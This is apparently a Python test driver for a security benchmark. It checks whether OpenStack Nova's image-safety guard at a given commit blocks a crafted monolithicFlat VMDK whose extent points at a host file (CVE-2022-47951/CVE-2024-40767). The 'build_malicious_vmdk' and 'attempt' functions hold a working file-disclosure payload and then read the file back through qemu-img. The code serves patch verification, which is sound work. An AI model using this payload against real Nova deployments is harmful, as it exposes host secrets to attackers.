# -*- coding: utf-8 -*-
"""Faithful driver for the CVE-2022-47951 -> CVE-2024-40767 guard.

Loads the REAL nova/virt/images.py at a specific commit (mounted at IMAGES_PATH)
and runs its genuine ``fetch_to_raw()`` image-safety gate against a crafted
malicious VMDK image, then -- exactly as Nova's download/convert pipeline does --
lets qemu-img consume the (unrejected) image, which discloses the referenced host
file.  For V1/V2 the REAL nova/image/format_inspector.py at the same commit is
loaded too (mounted at FORMAT_INSPECTOR_PATH).

Only the two version-specific files are version-specific.  qemu-img is the genuine
tool Nova shells to.  The heavy, guard-irrelevant sibling imports of images.py
(nova.privsep, nova.image.glance, nova.compute.utils, nova.conf) are satisfied by
inert stubs whose only job is to (a) hand the crafted file to fetch_to_raw as the
"downloaded" image, (b) report the attacker-claimed ``disk_format``, and (c) shell
the privileged qemu-img calls to the REAL qemu-img binary.  No nova code is edited:
do_image_deep_inspection / check_vmdk_image / fetch_to_raw all execute verbatim.
"""
import importlib.util
import json
import os
import subprocess
import sys
import tempfile
import types

IMAGES_PATH = os.environ.get("IMAGES_PATH", "/app/images.py")
FORMAT_INSPECTOR_PATH = os.environ.get("FORMAT_INSPECTOR_PATH", "")  # empty on V0
CANARY_PATH = os.environ.get("CANARY_PATH", "/canary/secret.txt")

# Per-request attacker-controlled image metadata (read by the stub glance API).
STATE = {"claim": "raw"}

_IMAGES = None  # cached real images.py module


# --------------------------------------------------------------------------- #
# Real qemu-img shims (the genuine tool Nova's privsep layer wraps).
# --------------------------------------------------------------------------- #
def _qemu_img_info_json(path, format=None):
    cmd = ["qemu-img", "info", "--output=json"]
    if format:
        cmd += ["-f", format]
    cmd += ["--", path]
    out = subprocess.check_output(cmd, stderr=subprocess.STDOUT)
    return out.decode("utf-8")


def _qemu_convert(source, dest, in_format, out_format):
    cmd = ["qemu-img", "convert"]
    if in_format:
        cmd += ["-f", in_format]
    cmd += ["-O", out_format, "--", source, dest]
    subprocess.check_output(cmd, stderr=subprocess.STDOUT)


# --------------------------------------------------------------------------- #
# Stub the guard-irrelevant nova.* import tree (fidelity note in module docstr).
# --------------------------------------------------------------------------- #
def _install_stubs():
    def mod(name, pkg=False):
        m = sys.modules.get(name) or types.ModuleType(name)
        if pkg:
            m.__path__ = []
        sys.modules[name] = m
        if "." in name:
            parent, child = name.rsplit(".", 1)
            setattr(sys.modules[parent], child, m)
        return m

    mod("nova", pkg=True)
    mod("nova.compute", pkg=True)
    mod("nova.image", pkg=True)
    mod("nova.privsep", pkg=True)

    # nova.exception -- minimal but real: the exception TYPES and the raise sites
    # live in images.py (unmodified); only the base class is provided here.
    exc = mod("nova.exception")

    class ImageUnacceptable(Exception):
        def __init__(self, image_id=None, reason=None):
            self.image_id = image_id
            self.reason = reason
            super().__init__("Image %s is unacceptable: %s" % (image_id, reason))

    class DiskNotFound(Exception):
        def __init__(self, location=None):
            self.location = location
            super().__init__("Disk not found: %s" % location)

    exc.ImageUnacceptable = ImageUnacceptable
    exc.DiskNotFound = DiskNotFound
    exc.NovaException = Exception

    # nova.i18n._ passthrough
    i18n = mod("nova.i18n")
    i18n._ = lambda s, *a, **k: s

    # nova.compute.utils.disk_ops_semaphore -- inert context manager
    cu = mod("nova.compute.utils")

    class _Sem:
        def __enter__(self):
            return self

        def __exit__(self, *a):
            return False

    cu.disk_ops_semaphore = _Sem()

    # nova.image.glance.API -- feeds fetch_to_raw the crafted file + claimed format
    glance = mod("nova.image.glance")

    class API:
        def get(self, context, image_href, **kw):
            # Nova trusts glance's stated disk_format here -- the crux of the bug.
            return {"disk_format": STATE["claim"]}

        def download(self, context, image_href, dest_path=None,
                     trusted_certs=None, **kw):
            # "download" = deliver the attacker-supplied bytes to the temp path.
            with open(image_href, "rb") as src, open(dest_path, "wb") as dst:
                dst.write(src.read())

    glance.API = API

    # nova.privsep.qemu -- shell the privileged qemu-img calls to the REAL binary
    pq = mod("nova.privsep.qemu")

    def unprivileged_qemu_img_info(path, format=None):
        return _qemu_img_info_json(path, format=format)

    def _convert(source, dest, in_format, out_format, instances_path,
                 compress, src_encryption=None, dest_encryption=None):
        _qemu_convert(source, dest, in_format, out_format)

    pq.unprivileged_qemu_img_info = unprivileged_qemu_img_info
    pq.privileged_qemu_img_info = unprivileged_qemu_img_info
    pq.unprivileged_convert_image = _convert
    pq.convert_image = _convert

    # nova.conf.CONF -- only the opts the guard reads, at their real defaults.
    conf = mod("nova.conf")

    class _NS:
        def __init__(self, **kw):
            self.__dict__.update(kw)

    conf.CONF = _NS(
        force_raw_images=True,
        instances_path=tempfile.gettempdir(),
        compute=_NS(vmdk_allowed_types=["streamOptimized", "monolithicSparse"]),
        workarounds=_NS(disable_deep_image_inspection=False),
    )

    # REAL nova/image/format_inspector.py (V1/V2 only) as nova.image.format_inspector
    if FORMAT_INSPECTOR_PATH:
        spec = importlib.util.spec_from_file_location(
            "nova.image.format_inspector", FORMAT_INSPECTOR_PATH)
        fi = importlib.util.module_from_spec(spec)
        sys.modules["nova.image.format_inspector"] = fi
        spec.loader.exec_module(fi)
        setattr(sys.modules["nova.image"], "format_inspector", fi)


def load_images():
    global _IMAGES
    if _IMAGES is not None:
        return _IMAGES
    _install_stubs()
    spec = importlib.util.spec_from_file_location("_real_images", IMAGES_PATH)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    _IMAGES = mod
    return mod


# --------------------------------------------------------------------------- #
# Malicious image construction + the full attempt pipeline.
# --------------------------------------------------------------------------- #
def build_malicious_vmdk(workdir, extent_path):
    """A monolithicFlat VMDK descriptor whose FLAT extent names an arbitrary host
    file -- the CVE-2022-47951 primitive.  qemu-img identifies this as vmdk /
    create-type monolithicFlat; converting it reads `extent_path` as disk data."""
    desc = (
        "# Disk DescriptorFile\n"
        "version=1\n"
        "CID=fffffffe\n"
        "parentCID=ffffffff\n"
        'createType="monolithicFlat"\n'
        "\n"
        "# Extent description\n"
        'RW 2048 FLAT "%s" 0\n'
        "\n"
        "# The Disk Data Base\n"
        "#DDB\n"
        'ddb.virtualHWVersion = "4"\n'
        'ddb.geometry.cylinders = "2"\n'
        'ddb.geometry.heads = "16"\n'
        'ddb.geometry.sectors = "63"\n'
        'ddb.adapterType = "ide"\n'
    ) % extent_path
    path = os.path.join(workdir, "mal.vmdk")
    with open(path, "w") as f:
        f.write(desc)
    return path


def attempt(claim, extent_path):
    """Full pipeline for one candidate:
      1. craft the malicious VMDK (FLAT extent -> host file),
      2. run Nova's REAL fetch_to_raw() safety gate with the claimed disk_format,
      3. if the gate does NOT reject it, model the downstream consumer: qemu-img
         probes the delivered image's true content and discloses the host file.
    Returns {"allowed", "body"} -- body carries the canary iff disclosed."""
    images = load_images()
    exc = sys.modules["nova.exception"].ImageUnacceptable
    workdir = tempfile.mkdtemp(prefix="pcb_")
    mal = build_malicious_vmdk(workdir, extent_path)
    out_path = os.path.join(workdir, "img.raw")
    STATE["claim"] = claim
    try:
        images.fetch_to_raw(None, mal, out_path)
    except exc as e:
        return {"claim": claim, "allowed": False, "body": "BLOCKED_BY_GUARD",
                "reason": getattr(e, "reason", str(e))}
    except Exception as e:  # any guard-raised rejection
        return {"claim": claim, "allowed": False, "body": "BLOCKED_BY_GUARD",
                "reason": repr(e)}
    # Gate passed -> Nova hands the image on.  The downstream consumer probes the
    # true content (no forced format), which reads the FLAT extent = host file.
    delivered = out_path if os.path.exists(out_path) else mal
    disc = os.path.join(workdir, "disc.raw")
    try:
        _qemu_convert(delivered, disc, None, "raw")
        with open(disc, "rb") as f:
            body = f.read().decode("utf-8", "replace")
    except Exception as e:
        body = "READ_ERROR:%r" % (e,)
    return {"claim": claim, "allowed": True, "body": body}
